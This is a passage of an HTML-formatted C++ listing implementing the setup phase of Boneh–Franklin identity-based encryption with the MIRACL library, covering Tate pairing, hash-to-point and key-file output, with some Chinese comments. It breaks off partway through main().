class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Boneh &amp; Franklin&#x27;s Identity Based Encryption</span><br><span class="hljs-comment">   </span><br><span class="hljs-comment">   Set-up phase</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   After this program has run the file common.ibe contains</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   &lt;Size of prime modulus in bits&gt;</span><br><span class="hljs-comment">   &lt;Prime p&gt;</span><br><span class="hljs-comment">   &lt;Prime q (divides p+1) &gt;</span><br><span class="hljs-comment">   &lt;Point P - x coordinate&gt;</span><br><span class="hljs-comment">   &lt;Point P - y coordinate&gt;</span><br><span class="hljs-comment">   &lt;Point Ppub - x coordinate&gt;</span><br><span class="hljs-comment">   &lt;Point Ppub - y coordinate&gt;</span><br><span class="hljs-comment">   &lt;Cube root of unity in Fp2 - x component &gt;</span><br><span class="hljs-comment">   &lt;Cube root of unity in Fp2 - y component &gt;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   The file master.ibe contains</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   &lt;The master secret s&gt;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   Requires: zzn2.cpp big.cpp zzn.cpp ecn.cpp</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fstream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;ctime&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;ecn.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;zzn.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;zzn2.h&quot;</span></span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span><br>&#123;<br>   <span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&quot;miracl.h&quot;</span></span><br>   <span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&quot;mirdef.h&quot;</span></span><br>&#125;<br><br><span class="hljs-comment">//2015版更新</span><br>FILE* __cdecl __iob_func(<span class="hljs-type">unsigned</span> i) &#123;<br>    <span class="hljs-keyword">return</span> __acrt_iob_func(i);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __cplusplus</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">//extern &quot;C&quot; &#123; FILE __iob_func[3] = &#123; *stdin,*stdout,*stderr &#125;; &#125;</span><br>FILE _iob[<span class="hljs-number">3</span>] = &#123; __iob_func(<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>], __iob_func(<span class="hljs-number">1</span>)[<span class="hljs-number">1</span>], __iob_func(<span class="hljs-number">2</span>)[<span class="hljs-number">2</span>] &#125;;<br><br><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/NODEFAULTLIB:libc.lib&quot;</span>)</span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> renum 2500</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> HASH_LEN 32</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> HASH_LEN1 20   <span class="hljs-comment">//用于求H2，因为本程序中q是160位的二进制数，而160/8=20</span></span><br><span class="hljs-comment">//H2中采用sha256要求HASH_LEN1 必须是32的倍数，因此，自己将H2内部函数其改为sha-1</span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PBITS 512</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> QBITS 160</span><br><br><span class="hljs-comment">// Using SHA-256 as basic hash algorithm</span><br><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Define one or the other of these</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Which is faster depends on the I/M ratio - See imratio.c</span><br><span class="hljs-comment">// Roughly if I/M ratio &gt; 16 use PROJECTIVE, otherwise use AFFINE</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-comment">// #define AFFINE</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PROJECTIVE</span><br><br><span class="hljs-comment">// Define this to use this idea ftp://ftp.computing.dcu.ie/pub/resources/crypto/short.pdf</span><br><span class="hljs-comment">// which enables denominator elimination</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SCOTT</span><br><br><span class="hljs-function">Miracl <span class="hljs-title">precision</span><span class="hljs-params">(<span class="hljs-number">16</span>, <span class="hljs-number">0</span>)</span></span>;  <span class="hljs-comment">// increase if PBITS increases. (32,0) for 1024 bit p</span><br><br><span class="hljs-comment">/*----------------------------------------------------------------------------Tate Paring 计算所需要的函数-----------------------------------------------------*/</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">extract</span><span class="hljs-params">(ECn&amp; A, ZZn&amp; x, ZZn&amp; y)</span></span><br><span class="hljs-function"></span>&#123;<br>    x = (A.<span class="hljs-built_in">get_point</span>())-&gt;X;<br>    y = (A.<span class="hljs-built_in">get_point</span>())-&gt;Y;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">extract</span><span class="hljs-params">(ECn&amp; A, ZZn&amp; x, ZZn&amp; y, ZZn&amp; z)</span></span><br><span class="hljs-function"></span>&#123;<br>    big t;<br>    x = (A.<span class="hljs-built_in">get_point</span>())-&gt;X;<br>    y = (A.<span class="hljs-built_in">get_point</span>())-&gt;Y;<br>    t = (A.<span class="hljs-built_in">get_point</span>())-&gt;Z;<br>    <span class="hljs-keyword">if</span> (A.<span class="hljs-built_in">get_status</span>() != MR_EPOINT_GENERAL)<br>        z = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">else</span><br>        z = t;<br>&#125;<br><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Line from A to destination C. Let A=(x,y)</span><br><span class="hljs-comment">// Line Y-slope.X-c=0, through A, so intercept c=y-slope.x</span><br><span class="hljs-comment">// Line Y-slope.X-y+slope.x = (Y-y)-slope.(X-x) = 0</span><br><span class="hljs-comment">// Now evaluate at Q -&gt; return (Qy-y)-slope.(Qx-x)</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-function">ZZn2 <span class="hljs-title">line</span><span class="hljs-params">(ECn&amp; A, ECn&amp; C, ZZn&amp; slope, ZZn2&amp; Qx, ZZn2&amp; Qy)</span></span><br><span class="hljs-function"></span>&#123;<br>    ZZn2 n = Qx, w = Qy;<br>    ZZn x, y, z, t;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> AFFINE</span><br>    <span class="hljs-built_in">extract</span>(A, x, y);<br>    n -= x; n *= slope;            <span class="hljs-comment">// 2 ZZn muls</span><br>    w -= y; n -= w;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PROJECTIVE</span><br>    <span class="hljs-built_in">extract</span>(A, x, y, z);<br>    x *= z; t = z; z *= z; z *= t;<br>    n *= z; n -= x;                <span class="hljs-comment">// 9 ZZn muls</span><br>    w *= z; w -= y;<br>    <span class="hljs-built_in">extract</span>(C, x, y, z);<br>    w *= z; n *= slope; n -= w;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-keyword">return</span> n;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> SCOTT</span><br><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Vertical line through point A</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-function">ZZn2 <span class="hljs-title">vertical</span><span class="hljs-params">(ECn&amp; A, ZZn2&amp; Qx)</span></span><br><span class="hljs-function"></span>&#123;<br>    ZZn2 n = Qx;<br>    ZZn x, y, z;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> AFFINE</span><br>    <span class="hljs-built_in">extract</span>(A, x, y);<br>    n -= x;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PROJECTIVE</span><br>    <span class="hljs-built_in">extract</span>(A, x, y, z);<br>    z *= z;<br>    n *= z; n -= x;                <span class="hljs-comment">// 3 ZZn muls</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-keyword">return</span> n;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Add A=A+B  (or A=A+A) </span><br><span class="hljs-comment">// Bump up num and denom</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// AFFINE doubling     - 12 ZZn muls, plus 1 inversion</span><br><span class="hljs-comment">// AFFINE adding       - 11 ZZn muls, plus 1 inversion</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// PROJECTIVE doubling - 26 ZZn muls</span><br><span class="hljs-comment">// PROJECTIVE adding   - 34 ZZn muls</span><br><span class="hljs-comment">//</span><br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">g</span><span class="hljs-params">(ECn&amp; A, ECn&amp; B, ZZn2&amp; Qx, ZZn2&amp; Qy, ZZn2&amp; num)</span></span><br><span class="hljs-function"></span>&#123;<br>    ZZn  lam, mQy;<br>    ZZn2 d, u;<br>    big ptr;<br>    ECn P = A;<br><br>    <span class="hljs-comment">// Evaluate line from A</span><br>    ptr = A.<span class="hljs-built_in">add</span>(B);<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> SCOTT</span><br>    <span class="hljs-keyword">if</span> (A.<span class="hljs-built_in">iszero</span>()) &#123; u = <span class="hljs-built_in">vertical</span>(P, Qx); d = <span class="hljs-number">1</span>; &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>        <span class="hljs-keyword">if</span> (ptr == <span class="hljs-literal">NULL</span>)<br>            u = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            lam = ptr;<br>            u = <span class="hljs-built_in">line</span>(P, A, lam, Qx, Qy);<br>        &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> SCOTT</span><br>        d = <span class="hljs-built_in">vertical</span>(A, Qx);<br>    &#125;<br><br>    num *= (u * <span class="hljs-built_in">conj</span>(d));    <span class="hljs-comment">// 6 ZZn muls  </span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>        <span class="hljs-comment">// denominator elimination!</span><br>        num *= u;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// Tate Pairing </span><br>    <span class="hljs-comment">//</span><br><br><span class="hljs-function">BOOL <span class="hljs-title">fast_tate_pairing</span><span class="hljs-params">(ECn&amp; P, ZZn2&amp; Qx, ZZn2&amp; Qy, Big&amp; q, ZZn2&amp; res)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> i, nb;<br>    Big n, p;<br>    ECn A;<br><br><br>    <span class="hljs-comment">// q.P = 2^17*(2^142.P +P) + P</span><br><br>    res = <span class="hljs-number">1</span>;<br>    A = P;    <span class="hljs-comment">// reset A</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> SCOTT</span><br>    <span class="hljs-comment">// we can avoid last iteration..</span><br>    n = q - <span class="hljs-number">1</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    n = q;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    nb = <span class="hljs-built_in">bits</span>(n);<br><br>    <span class="hljs-keyword">for</span> (i = nb - <span class="hljs-number">2</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>    &#123;<br>        res *= res;<br>        <span class="hljs-built_in">g</span>(A, A, Qx, Qy, res);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">bit</span>(n, i))<br>            <span class="hljs-built_in">g</span>(A, P, Qx, Qy, res);<br>    &#125;<br>    <span class="hljs-type">bool</span> bb = (A != -P);<br>    <span class="hljs-type">bool</span> bbb = res.<span class="hljs-built_in">iszero</span>();<br><br><br>    p = <span class="hljs-built_in">get_modulus</span>();         <span class="hljs-comment">// get p</span><br>    res = <span class="hljs-built_in">pow</span>(res, (p + <span class="hljs-number">1</span>) / q);   <span class="hljs-comment">// raise to power of (p^2-1)/q</span><br>    res = <span class="hljs-built_in">conj</span>(res) / res;<br>    <span class="hljs-keyword">if</span> (res.<span class="hljs-built_in">isunity</span>()) <span class="hljs-keyword">return</span> FALSE;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-function">BOOL <span class="hljs-title">ecap</span><span class="hljs-params">(ECn&amp; P, ECn&amp; Q, Big&amp; order, ZZn2&amp; cube, ZZn2&amp; res)</span></span><br><span class="hljs-function"></span>&#123;<br>    ZZn2 Qx, Qy;<br>    Big xx, yy;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> SCOTT</span><br>    ZZn a, b, x, y, ib, w, t1, y2, ib2;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    ZZn2 lambda, ox;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    Q.<span class="hljs-built_in">get</span>(xx, yy);<br>    Qx = (ZZn)xx * cube;<br>    Qy = (ZZn)yy;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> SCOTT</span><br>    <span class="hljs-comment">// point doubling</span><br>    lambda = (<span class="hljs-number">3</span> * Qx * Qx) / (Qy + Qy);<br>    ox = Qx;<br>    Qx = lambda * lambda - (Qx + Qx);<br>    Qy = lambda * (ox - Qx) - Qy;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    <span class="hljs-comment">//explicit point subtraction</span><br>    Qx.<span class="hljs-built_in">get</span>(a, b);<br>    y = yy;<br>    ib = (ZZn)<span class="hljs-number">1</span> / b;<br><br>    t1 = a * b * b;<br>    y2 = y * y;<br>    ib2 = ib * ib;<br>    w = y2 + <span class="hljs-number">2</span> * t1;<br>    x = -w * ib2;<br>    y = -y * (w + t1) * (ib2 * ib);<br>    Qx.<span class="hljs-built_in">set</span>(x);<br>    Qy.<span class="hljs-built_in">set</span>((ZZn)<span class="hljs-number">0</span>, y);<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">fast_tate_pairing</span>(P, Qx, Qy, order, res)) <span class="hljs-keyword">return</span> TRUE;<br>    <span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// ecap(.) function - apply distortion map</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Qx is in ZZn if SCOTT is defined. Qy is in ZZn if SCOTT is not defined. </span><br><span class="hljs-comment">// This can be exploited for some further optimisations. </span><br><span class="hljs-comment">/*----------------------------------------------------------------------------Tate Paring 计算所需要的函数-----------------------------------------------------*/</span><br><br><br><span class="hljs-comment">/*----------------------------------------------------------------------------相关Hash函数所需的函数-----------------------------------------------------*/</span><br><span class="hljs-function">Big <span class="hljs-title">H1</span><span class="hljs-params">(<span class="hljs-type">char</span>* string)</span></span><br><span class="hljs-function"></span>&#123; <span class="hljs-comment">// Hash a zero-terminated string to a number &lt; modulus</span><br>    Big h, p;<br>    <span class="hljs-type">char</span> s[HASH_LEN];<br>    <span class="hljs-type">int</span> i, j;<br>    sha256 sh;<br><br>    <span class="hljs-built_in">shs256_init</span>(&amp;sh);<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>;; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (string[i] == <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;<br>        <span class="hljs-built_in">shs256_process</span>(&amp;sh, string[i]);<br>    &#125;<br>    <span class="hljs-built_in">shs256_hash</span>(&amp;sh, s);<br>    p = <span class="hljs-built_in">get_modulus</span>();<br>    h = <span class="hljs-number">1</span>; j = <span class="hljs-number">0</span>; i = <span class="hljs-number">1</span>;<br>    forever<br>    &#123;<br>        h *= <span class="hljs-number">256</span>;<br>        <span class="hljs-keyword">if</span> (j == HASH_LEN) &#123; h += i++; j = <span class="hljs-number">0</span>; &#125;<br>        <span class="hljs-keyword">else</span>         h += s[j++];<br>        <span class="hljs-keyword">if</span> (h &gt;= p) <span class="hljs-keyword">break</span>;<br>    &#125;<br>    h %= p;<br>    <span class="hljs-keyword">return</span> h;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">H2</span><span class="hljs-params">(ZZn2 x, <span class="hljs-type">char</span>* s)</span></span><br><span class="hljs-function"></span>&#123; <span class="hljs-comment">// Hash an Fp2 to an n-byte string s[.]. Return n</span><br>    sha sh;<br>    Big a, b;<br>    <span class="hljs-type">int</span> m;<br><br>    <span class="hljs-built_in">shs_init</span>(&amp;sh);<br>    x.<span class="hljs-built_in">get</span>(a, b);<br><br>    <span class="hljs-keyword">while</span> (a &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        m = a % <span class="hljs-number">160</span>;<br>        <span class="hljs-built_in">shs_process</span>(&amp;sh, m);<br>        a /= <span class="hljs-number">160</span>;<br>    &#125;<br>    <span class="hljs-keyword">while</span> (b &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        m = b % <span class="hljs-number">160</span>;<br>        <span class="hljs-built_in">shs_process</span>(&amp;sh, m);<br>        b /= <span class="hljs-number">160</span>;<br>    &#125;<br>    <span class="hljs-built_in">shs_hash</span>(&amp;sh, s);<br><br>    <span class="hljs-keyword">return</span> HASH_LEN1;<br><br>&#125;<br><span class="hljs-function">Big <span class="hljs-title">H3</span><span class="hljs-params">(<span class="hljs-type">char</span>* string, Big qm)</span></span><br><span class="hljs-function"></span>&#123; <span class="hljs-comment">// Hash a zero-terminated string to a number &lt; modulus q</span><br>    Big h;<br>    <span class="hljs-type">char</span> s[HASH_LEN1];<br>    <span class="hljs-type">int</span> i, j;<br>    sha sh;<br><br>    <span class="hljs-built_in">shs_init</span>(&amp;sh);<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>;; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (string[i] == <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;<br>        <span class="hljs-built_in">shs_process</span>(&amp;sh, string[i]);<br>    &#125;<br>    <span class="hljs-built_in">shs_hash</span>(&amp;sh, s);<br>    <span class="hljs-comment">//q=get_modulus();</span><br>    <span class="hljs-comment">//cout&lt;&lt;&quot;modulus&quot;&lt;&lt;p&lt;&lt;endl;//自己加的查看p值的语句，通过p值可知get_modulus()得到了椭圆曲线所在有限域的素数P</span><br>    h = <span class="hljs-number">1</span>; j = <span class="hljs-number">0</span>; i = <span class="hljs-number">1</span>;<br>    forever<br>    &#123;<br>        h *= <span class="hljs-number">160</span>;<br>        <span class="hljs-keyword">if</span> (j == HASH_LEN1)<br>        &#123;<br>h += i++; j = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>h += s[j++];<br><span class="hljs-keyword">if</span> (h &gt;= qm) <span class="hljs-keyword">break</span>;<br>    &#125;<br>    h %= qm;<br>    <span class="hljs-keyword">return</span> h;<br>&#125;<br><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Given y, get x=(y^2-1)^(1/3) mod p (from curve equation)</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-function">Big <span class="hljs-title">getx</span><span class="hljs-params">(Big y)</span></span><br><span class="hljs-function"></span>&#123;<br>    Big p = <span class="hljs-built_in">get_modulus</span>();<br>    Big t = <span class="hljs-built_in">modmult</span>(y + <span class="hljs-number">1</span>, y - <span class="hljs-number">1</span>, p);   <span class="hljs-comment">// avoids overflow</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">pow</span>(t, (<span class="hljs-number">2</span> * p - <span class="hljs-number">1</span>) / <span class="hljs-number">3</span>, p);<br>&#125;<br> <br><span class="hljs-comment">//</span><br><span class="hljs-comment">// MapToPoint</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-function">ECn <span class="hljs-title">map_to_point</span><span class="hljs-params">(<span class="hljs-type">char</span> *ID,Big cof)</span></span><br><span class="hljs-function"></span>&#123;<br>    ECn Q;<br>    Big x0, y0 = <span class="hljs-built_in">H1</span>(ID);<br>    x0 = <span class="hljs-built_in">getx</span>(y0);<br>    Q.<span class="hljs-built_in">set</span>(x0, y0);<br>    Q *= cof;<br>    <span class="hljs-keyword">return</span> Q;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">xorStrings</span><span class="hljs-params">(<span class="hljs-type">char</span>* str1, <span class="hljs-type">char</span>* str2, <span class="hljs-type">char</span>* result, <span class="hljs-type">int</span> len)</span> </span>&#123;<br><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br><br>        <span class="hljs-type">char</span> c1 = str1[i];<br>        <span class="hljs-type">char</span> c2 = str2[i];<br><br>        result[i] = c1 ^ c2;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-function">ofstream <span class="hljs-title">common</span><span class="hljs-params">(<span class="hljs-string">&quot;common.ibe&quot;</span>)</span></span>;<br>    <span class="hljs-function">ofstream <span class="hljs-title">master</span><span class="hljs-params">(<span class="hljs-string">&quot;master.ibe&quot;</span>)</span></span>;<br>    <span class="hljs-comment">//ECn P,Ppub;</span><br>    ECn P, Q;<br>    <span class="hljs-comment">//ZZn px,py;//自加，定义的是点的x,y坐标</span><br>    ZZn2 cube, w;<span class="hljs-comment">//自加</span><br>   <span class="hljs-comment">// ZZn2 cube;</span><br>   <span class="hljs-comment">// Big s,p,q,t,n,cof,x,y;</span><br>    Big a, b, c, d1, d2, p, q, t, n, cof;<br>    <span class="hljs-type">long</span> seed;<br>    <span class="hljs-type">char</span> pad[HASH_LEN1];<span class="hljs-comment">//自加</span><br>    <span class="hljs-comment">//char pad[20]=&#123;0&#125;;</span><br>    miracl* mip = &amp;precision;<br><br>    cout &lt;&lt; <span class="hljs-string">&quot;Enter 9 digit random number seed  = &quot;</span>;<br>    cin &gt;&gt; seed;<br>    <span class="hljs-built_in">irand</span>(seed);<br><br>    <span class="hljs-comment">// SET-UP</span><br>    <span class="hljs-comment">/*-------------------------------------------------------------产生素数阶q-------------------------------------------------------------------------*/</span><br>    q = <span class="hljs-built_in">pow</span>((Big)<span class="hljs-number">2</span>, <span class="hljs-number">159</span>) + <span class="hljs-built_in">pow</span>((Big)<span class="hljs-number">2</span>, <span class="hljs-number">17</span>) + <span class="hljs-number">1</span>;<br>    